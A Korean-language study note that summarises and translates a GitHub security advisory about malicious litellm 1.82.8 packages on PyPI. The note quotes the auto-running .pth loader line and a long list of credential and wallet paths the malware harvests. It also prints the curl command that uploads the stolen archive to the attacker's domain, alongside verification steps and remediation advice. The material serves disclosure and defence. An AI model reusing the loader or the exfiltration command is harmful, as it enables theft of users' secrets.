---
title: "HN 보도: PyPI의 Litellm 1.82.7과 1.82.8 버전 손상됨"
tags: [dev-digest, hot]
type: study
tech:
  - frontend
level: ""
created: 2026-03-24
aliases: []
---

> [!info] 원문
> [Tell HN: Litellm 1.82.7 and 1.82.8 on PyPI are compromised](https://github.com/BerriAI/litellm/issues/24512) · Hacker News (Top)

## 핵심 개념

> [!abstract]
> litellm==1.82.8 PyPI 패키지에 악성 .pth 파일(litellm_init.pth, 34,628바이트)이 포함되어 있으며, Python 인터프리터가 시작될 때마다 자동으로 자격증명 탈취 스크립트를 실행합니다. 이는 공급망 공격으로, 악성 파일이 패키지의 RECORD에 명시되어 있습니다. 공격자는 환경 변수, SSH 키, AWS/GCP 자격증명, 쿠버네티스 시크릿, 암호화폐 지갑 등을 수집하여 공격자 서버(https://models.litellm.cloud/)로 전송합니다.

## 상세 내용

- 악성 .pth 파일의 작동 원리: Python의 .pth 파일은 site-packages 디렉토리에 배치되면 인터프리터 시작 시 자동 실행되는 메커니즘을 악용하며, litellm을 명시적으로 임포트할 필요가 없습니다.
- 다단계 페이로드 구조: 공격 코드는 이중 Base64 인코딩으로 난독화되어 있으며, 스테이지 1에서는 시스템 정보(호스트명, 환경변수), SSH 키, AWS/GCP/Azure 자격증명, Kubernetes 설정, Docker 설정, CI/CD 시크릿 등을 수집합니다.
- 암호화 및 유출: 수집된 데이터는 openssl을 이용하여 AES-256-CBC 방식으로 암호화되고, 세션 키는 4096비트 RSA 공개 키로 암호화된 후 tpcp.tar.gz로 압축되어 공격자 서버로 전송됩니다.
- 광범위한 자격증명 탈취: 암호화폐 지갑(비트코인, 라이트코인, 이더리움 등), SSL/TLS 개인 키, Slack/Discord 웹훅 URL, 데이터베이스 자격증명(PostgreSQL, MySQL, Redis) 등 매우 광범위한 민감 정보가 대상입니다.
- 영향 범위: litellm 1.82.8을 설치한 모든 사용자의 환경 변수, SSH 키, 클라우드 자격증명이 손상되었으며, 로컬 개발 머신, CI/CD 파이프라인, Docker 컨테이너, 프로덕션 서버 등 모든 환경이 영향을 받습니다.
- 공격자 식별: 진짜 Litellm 공식 도메인은 litellm.ai이나, 공격자는 litellm.cloud 도메인을 사용하여 피싱을 시도했습니다.
- 권장 조치: PyPI에서 litellm 1.82.8을 즉시 제거하고, 사용자는 site-packages에서 litellm_init.pth 파일을 확인하며, 해당 버전이 설치된 모든 시스템의 환경변수와 설정 파일에 있던 모든 자격증명을 로테이션해야 합니다.

> [!tip] 왜 중요한가
> 이는 Python 패키지 생태계의 심각한 보안 위협으로, .pth 파일의 자동 실행 메커니즘을 악용한 공격 사례이며, 개발자는 의존성 업데이트 시 공급망 공격 위험을 인식하고 신속한 자격증명 로테이션이 필수입니다.

## 전문 번역

# [긴급 보안 공지] litellm 1.82.8 버전 악성 코드 감염 - 자격증명 탈취

## 요약

PyPI에 배포된 litellm 1.82.8 휠 패키지에 악성 .pth 파일(litellm_init.pth, 34,628 바이트)이 포함되어 있습니다. 이 파일은 Python 인터프리터가 시작될 때마다 자동으로 실행되는데, litellm을 import 할 필요도 없습니다. 순수한 공급망 침해(supply chain compromise) 사건입니다.

패키지의 RECORD 파일에도 이 악성 파일이 명시되어 있네요:

```
litellm_init.pth,sha256=ceNa7wMJnHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628
```

## 직접 확인해보기

다음 명령어로 직접 확인할 수 있습니다:

```bash
pip download litellm==1.82.8 --no-deps -d /tmp/check
python3 -c "
import zipfile, os
whl = '/tmp/check/' + [f for f in os.listdir('/tmp/check') if f.endswith('.whl')][0]
with zipfile.ZipFile(whl) as z:
pth = [n for n in z.namelist() if n.endswith('.pth')]
print('PTH files:', pth)
for p in pth:
print(z.read(p)[:300])
"
```

결과를 보면 litellm_init.pth 파일에 다음과 같은 코드가 들어있습니다:

```python
import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('...'))"])
```

## 악성 동작 분석

페이로드는 이중 base64 인코딩되어 있습니다. 디코딩하면 다음과 같은 행동을 합니다:

### 1단계: 정보 수집

시스템에서 민감한 데이터를 모두 긁어갑니다:

**시스템 정보**
- hostname, whoami, uname -a, ip addr, ip route

**환경 변수**
- printenv (모든 API 키, 시크릿, 토큰 포함)

**SSH 키**
- ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.ssh/id_ecdsa, ~/.ssh/id_dsa
- ~/.ssh/authorized_keys, ~/.ssh/known_hosts, ~/.ssh/config

**Git 자격증명**
- ~/.gitconfig, ~/.git-credentials

**클라우드 자격증명**
- AWS: ~/.aws/credentials, ~/.aws/config, IMDS 토큰 + 보안 자격증명
- GCP: ~/.config/gcloud/application_default_credentials.json
- Azure: ~/.azure/

**쿠버네티스 시크릿**
- ~/.kube/config, /etc/kubernetes/admin.conf, /etc/kubernetes/kubelet.conf
- /etc/kubernetes/controller-manager.conf, /etc/kubernetes/scheduler.conf
- 서비스 어카운트 토큰

**컨테이너 및 패키지 관리자 설정**
- ~/.docker/config.json, /kaniko/.docker/config.json, /root/.docker/config.json
- ~/.npmrc, ~/.vault-token, ~/.netrc, ~/.lftprc, ~/.msmtprc, ~/.my.cnf, ~/.pgpass, ~/.mongorc.js

**셸 히스토리**
- ~/.bash_history, ~/.zsh_history, ~/.sh_history, ~/.mysql_history, ~/.psql_history, ~/.rediscli_history

**암호화폐 지갑**
- ~/.bitcoin/, ~/.litecoin/, ~/.dogecoin/, ~/.zcash/, ~/.dashcore/, ~/.ripple/, ~/.bitmonero/
- ~/.ethereum/keystore/, ~/.cardano/, ~/.config/solana/

**SSL/TLS 개인 키**
- /etc/ssl/private/, Let's Encrypt .pem 및 .key 파일

**CI/CD 시크릿**
- terraform.tfvars, .gitlab-ci.yml, .travis.yml, Jenkinsfile, .drone.yml, Anchor.toml, ansible.cfg

**데이터베이스 자격증명**
- PostgreSQL, MySQL, Redis, LDAP 설정 파일

**웹훅 URL**
- 환경 변수와 설정 파일에서 Slack/Discord 웹훅 URL 검색

### 2단계: 암호화 및 유출

수집된 데이터는 다음 과정을 거칩니다:

1. 임시 파일에 저장
2. openssl rand로 무작위 32바이트 AES-256 세션 키 생성
3. openssl enc -aes-256-cbc -pbkdf2로 데이터 암호화
4. 하드코딩된 4096비트 RSA 공개 키로 AES 세션 키를 암호화
5. 두 파일을 tpcp.tar.gz로 압축
6. 다음 주소로 유출:

```bash
curl -s -o /dev/null -X POST \
"https://models.litellm.cloud/" \
-H "Content-Type: application/octet-stream" \
-H "X-Filename: tpcp.tar.gz" \
--data-binary @tpcp.tar.gz
```

## 핵심 기술 상세

**실행 메커니즘**: site-packages/ 디렉토리의 .pth 파일은 Python 인터프리터 시작 시 자동으로 실행됩니다. import 문이 필요 없습니다.

**은폐 기법**: 페이로드가 이중 base64 인코딩되어 있어서 일반적인 grep으로는 탐지가 어렵습니다.

**유출 대상**: https://models.litellm.cloud/ (공식 도메인 litellm.ai가 아니라 litellm.cloud입니다)

**RSA 공개 키 (처음 64자)**: MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+...

## 영향 범위

litellm==1.82.8을 pip으로 설치한 모든 사용자가 영향을 받습니다:

- 로컬 개발 머신
- CI/CD 파이프라인
- Docker 컨테이너
- 프로덕션 서버

## 해당 버전

**확인됨**: litellm==1.82.8 (PyPI 휠 패키지 litellm-1.82.8-py3-none-any.whl)

**기타 버전**: 아직 조사 중 — 공격자가 여러 릴리스를 침해했을 수도 있습니다.

## 권장 조치

**PyPI 관리자**
- litellm 1.82.8을 즉시 yanking 처리

**사용자**
- site-packages/ 디렉토리에서 litellm_init.pth 파일 확인
- litellm 1.82.8이 설치되었던 모든 시스템의 환경 변수와 설정 파일에 있던 자격증명 전부 재발급
- 노출된 가능성이 있는 모든 토큰, API 키, 비밀번호 변경

**BerriAI (litellm 개발팀)**
- PyPI 배포 자격증명 감사
- CI/CD 파이프라인 침해 여부 확인

## 환경 정보

- OS: Ubuntu 24.04 (Docker 컨테이너)
- Python: 3.13
- pip은 PyPI에서 설치
- 발견일: 2026-03-24

더 자세한 업데이트는 [#24518](https://github.com/BerriAI/litellm/issues/24518)을 참고하세요.

## 참고 자료

- [원문 링크](https://github.com/BerriAI/litellm/issues/24512)
- via Hacker News (Top)
- engagement: 414

## 관련 노트

- [[2026-03-24|2026-03-24 Dev Digest]]
